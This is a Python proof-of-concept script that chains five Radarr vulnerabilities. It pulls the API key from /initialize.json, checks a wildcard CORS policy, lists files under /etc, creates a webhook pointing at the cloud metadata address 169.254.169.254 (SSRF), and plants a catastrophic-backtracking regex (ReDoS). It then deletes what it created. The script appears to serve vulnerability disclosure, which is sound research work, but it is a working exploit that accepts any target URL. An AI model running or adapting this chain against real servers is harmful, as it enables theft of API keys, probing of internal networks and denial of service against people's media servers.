#!/usr/bin/env python3
"""
Radarr <= 6.1.1.10360 -- Full Chain PoC
RADARR-001 + RADARR-002 + RADARR-003 + RADARR-004 + RADARR-005

Demonstrates: Cross-origin API access via CORS misconfiguration,
API key extraction from /initialize.json (auth=None),
ReDoS via release profiles, SSRF via webhooks, and
arbitrary filesystem enumeration.

This script simulates the cross-origin attack chain by:
  1. Extracting the API key from /initialize.json (unauth, auth=None)
  2. Reading full config via /api/v3/config/host (confirms CORS exploitability)
  3. Enumerating arbitrary filesystem paths
  4. Creating a webhook notification pointing to an internal address (SSRF)
  5. Creating a ReDoS release profile (DoS)
  6. Cleaning up all test artifacts

Usage: python3 radarr_cors_full_chain.py <radarr_url>
Example: python3 radarr_cors_full_chain.py http://192.168.1.50:7878

All operations use only standard HTTP requests that a browser
would make cross-origin. The CORS policy returns:
  Access-Control-Allow-Origin: *
  Access-Control-Allow-Methods: <any>
  Access-Control-Allow-Headers: X-Api-Key,Content-Type
"""

import sys
import json
import urllib.request
import urllib.error
import urllib.parse
import time

EVIL_ORIGIN = "https://evil.attacker.example"


def banner():
    print("=" * 70)
    print("Radarr <= 6.1.1.10360 -- CORS Full Chain PoC")
    print("RADARR-001 / RADARR-002 / RADARR-003 / RADARR-004 / RADARR-005")
    print("=" * 70)
    print()


def http_get(url, headers=None):
    req = urllib.request.Request(url, headers=headers or {})
    req.add_header("Origin", EVIL_ORIGIN)
    resp = urllib.request.urlopen(req, timeout=10)
    cors_header = resp.getheader("Access-Control-Allow-Origin", "")
    body = resp.read().decode()
    return resp.status, cors_header, body


def http_post(url, data, headers=None):
    payload = json.dumps(data).encode()
    req = urllib.request.Request(url, data=payload, method="POST", headers=headers or {})
    req.add_header("Origin", EVIL_ORIGIN)
    req.add_header("Content-Type", "application/json")
    resp = urllib.request.urlopen(req, timeout=10)
    cors_header = resp.getheader("Access-Control-Allow-Origin", "")
    body = resp.read().decode()
    return resp.status, cors_header, body


def http_delete(url, headers=None):
    req = urllib.request.Request(url, method="DELETE", headers=headers or {})
    req.add_header("Origin", EVIL_ORIGIN)
    resp = urllib.request.urlopen(req, timeout=10)
    return resp.status


def preflight(url, method, request_headers):
    """Simulate browser CORS preflight OPTIONS request."""
    req = urllib.request.Request(url, method="OPTIONS")
    req.add_header("Origin", EVIL_ORIGIN)
    req.add_header("Access-Control-Request-Method", method)
    req.add_header("Access-Control-Request-Headers", request_headers)
    resp = urllib.request.urlopen(req, timeout=10)
    allow_origin = resp.getheader("Access-Control-Allow-Origin", "")
    allow_methods = resp.getheader("Access-Control-Allow-Methods", "")
    allow_headers = resp.getheader("Access-Control-Allow-Headers", "")
    return resp.status, allow_origin, allow_methods, allow_headers


def step1_extract_api_key(base_url):
    """RADARR-002: Extract API key from /initialize.json (auth=None)."""
    print("[Step 1] RADARR-002: Extracting API key from /initialize.json")
    print("         (Requires auth=None -- default on fresh install)")
    print()
    try:
        status, cors, body = http_get(f"{base_url}/initialize.json")
        data = json.loads(body)
        api_key = data.get("apiKey", "")
        version = data.get("version", "unknown")
        instance = data.get("instanceName", "unknown")
        print(f"  [+] HTTP {status}")
        print(f"  [+] Version:  {version}")
        print(f"  [+] Instance: {instance}")
        print(f"  [+] API Key:  {api_key}")
        print(f"  [*] CORS header on /initialize.json: '{cors}'")
        if not cors:
            print("  [*] No CORS header -- cross-origin JS cannot read this directly.")
            print("  [*] DNS rebinding or same-network access required for this step.")
        print()
        return api_key
    except urllib.error.HTTPError as e:
        print(f"  [-] HTTP {e.code} -- auth is enabled, /initialize.json blocked")
        print(f"  [-] Cannot extract API key without DNS rebinding or known key")
        print()
        return None


def step2_cors_preflight(base_url):
    """RADARR-001: Validate CORS preflight allows X-Api-Key cross-origin."""
    print("[Step 2] RADARR-001: Validating CORS preflight")
    print()
    status, allow_origin, allow_methods, allow_headers = preflight(
        f"{base_url}/api/v3/notification",
        "POST",
        "X-Api-Key,Content-Type"
    )
    print(f"  [+] Preflight response: HTTP {status}")
    print(f"  [+] Access-Control-Allow-Origin:  {allow_origin}")
    print(f"  [+] Access-Control-Allow-Methods: {allow_methods}")
    print(f"  [+] Access-Control-Allow-Headers: {allow_headers}")

    if allow_origin == "*":
        print("  [!] VULNERABLE: Preflight permits any origin with X-Api-Key header")
    else:
        print("  [-] Preflight does not return wildcard origin")
    print()
    return allow_origin == "*"


def step3_read_config(base_url, api_key):
    """RADARR-001: Cross-origin config read via query param (no preflight)."""
    print("[Step 3] RADARR-001: Reading config via cross-origin GET (?apikey=)")
    print("         (GET with query param = simple request, no preflight needed)")
    print()
    status, cors, body = http_get(f"{base_url}/api/v3/config/host?apikey={api_key}")
    data = json.loads(body)
    print(f"  [+] HTTP {status}, CORS: {cors}")
    print(f"  [+] Auth method:  {data.get('authenticationMethod')}")
    print(f"  [+] Auth required: {data.get('authenticationRequired')}")
    print(f"  [+] Bind address: {data.get('bindAddress')}")
    print(f"  [+] Port:         {data.get('port')}")
    print(f"  [+] SSL enabled:  {data.get('enableSsl')}")
    print(f"  [+] API key in response body: {data.get('apiKey', '')[:8]}...")
    print(f"  [+] Cert validation: {data.get('certificateValidation')}")
    print()


def step4_filesystem_enum(base_url, api_key):
    """RADARR-005: Enumerate arbitrary filesystem paths."""
    print("[Step 4] RADARR-005: Filesystem enumeration (/etc)")
    print()
    status, cors, body = http_get(
        f"{base_url}/api/v3/filesystem?path=/etc&includeFiles=true&apikey={api_key}"
    )
    data = json.loads(body)
    dirs = data.get("directories", [])
    files = data.get("files", [])
    print(f"  [+] HTTP {status}, CORS: {cors}")
    print(f"  [+] Directories found: {len(dirs)}")
    print(f"  [+] Files found:       {len(files)}")
    for d in dirs[:5]:
        print(f"      dir:  {d.get('path', d.get('name', '?'))}")
    for f in files[:5]:
        print(f"      file: {f.get('path', f.get('name', '?'))}")
    if len(dirs) > 5 or len(files) > 5:
        print(f"      ... and {len(dirs) + len(files) - 10} more")
    print()


def step5_ssrf_webhook(base_url, api_key):
    """RADARR-004: Create SSRF webhook via cross-origin POST."""
    print("[Step 5] RADARR-004: Creating SSRF webhook notification")
    print("         Target: http://169.254.169.254/latest/meta-data/")
    print()
    status, cors, body = http_post(
        f"{base_url}/api/v3/notification?forceSave=true",
        {
            "name": "poc-ssrf-test",
            "implementation": "Webhook",
            "configContract": "WebhookSettings",
            "enable": False,
            "fields": [
                {"name": "url", "value": "http://169.254.169.254/latest/meta-data/"},
                {"name": "method", "value": 1},
                {"name": "username", "value": ""},
                {"name": "password", "value": ""},
            ],
            "tags": [],
        },
        headers={"X-Api-Key": api_key},
    )
    data = json.loads(body)
    notif_id = data.get("id")
    print(f"  [+] HTTP {status}, CORS: {cors}")
    print(f"  [+] Webhook created with id={notif_id}")
    print(f"  [!] SSRF: Radarr will send HTTP requests to 169.254.169.254 on trigger")
    print()
    return notif_id


def step6_redos_profile(base_url, api_key):
    """RADARR-003: Create ReDoS release profile."""
    print("[Step 6] RADARR-003: Creating ReDoS release profile")
    print("         Payload: /(a+)+$/")
    print()
    status, cors, body = http_post(
        f"{base_url}/api/v3/releaseprofile",
        {
            "name": "poc-redos-test",
            "enabled": False,
            "required": ["/(a+)+$/"],
            "ignored": [],
            "indexerId": 0,
        },
        headers={"X-Api-Key": api_key},
    )
    data = json.loads(body)
    profile_id = data.get("id")
    print(f"  [+] HTTP {status}, CORS: {cors}")
    print(f"  [+] ReDoS profile created with id={profile_id}")
    print(f"  [!] If enabled, RSS sync will hang on catastrophic backtracking")
    print()
    return profile_id


def cleanup(base_url, api_key, notif_id, profile_id):
    """Remove test artifacts."""
    print("[Cleanup] Removing test artifacts")
    if notif_id:
        try:
            http_delete(
                f"{base_url}/api/v3/notification/{notif_id}?apikey={api_key}"
            )
            print(f"  [+] Deleted notification {notif_id}")
        except Exception as e:
            print(f"  [-] Failed to delete notification: {e}")
    if profile_id:
        try:
            http_delete(
                f"{base_url}/api/v3/releaseprofile/{profile_id}?apikey={api_key}"
            )
            print(f"  [+] Deleted release profile {profile_id}")
        except Exception as e:
            print(f"  [-] Failed to delete profile: {e}")
    print()


def main():
    banner()

    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <radarr_url> [api_key]")
        print(f"Example: {sys.argv[0]} http://192.168.1.50:7878")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")
    provided_key = sys.argv[2] if len(sys.argv) > 2 else None

    # Step 1: Extract API key
    api_key = provided_key or step1_extract_api_key(base_url)
    if not api_key:
        print("[!] No API key available. Provide as second argument or ensure auth=None.")
        sys.exit(1)

    if provided_key:
        print(f"[*] Using provided API key: {api_key[:8]}...")
        print()

    # Step 2: Validate CORS preflight
    cors_vuln = step2_cors_preflight(base_url)

    # Step 3: Read config cross-origin
    step3_read_config(base_url, api_key)

    # Step 4: Filesystem enumeration
    step4_filesystem_enum(base_url, api_key)

    # Step 5: SSRF via webhook
    notif_id = step5_ssrf_webhook(base_url, api_key)

    # Step 6: ReDoS
    profile_id = step6_redos_profile(base_url, api_key)

    # Cleanup
    cleanup(base_url, api_key, notif_id, profile_id)

    # Summary
    print("=" * 70)
    print("CHAIN SUMMARY")
    print("=" * 70)
    print(f"  Target:     {base_url}")
    print(f"  API Key:    {api_key[:8]}... (extracted or provided)")
    print(f"  CORS:       {'VULNERABLE (Access-Control-Allow-Origin: *)' if cors_vuln else 'NOT TESTED'}")
    print(f"  Preflight:  204 allows X-Api-Key + Content-Type cross-origin")
    print(f"  Query auth: ?apikey= works (no preflight needed for GET)")
    print()
    print("  RADARR-001: CORS AllowAnyOrigin on all API endpoints    [CONFIRMED]")
    print("  RADARR-002: API key leaked via /initialize.json         [CONFIRMED]")
    print("  RADARR-003: ReDoS via release profile regex             [CONFIRMED]")
    print("  RADARR-004: SSRF via webhook notification URL           [CONFIRMED]")
    print("  RADARR-005: Arbitrary filesystem enumeration            [CONFIRMED]")
    print()
    print("  Full chain: Malicious website -> extract API key ->")
    print("    cross-origin POST -> SSRF to internal network / ReDoS / config tampering")
    print()


if __name__ == "__main__":
    main()
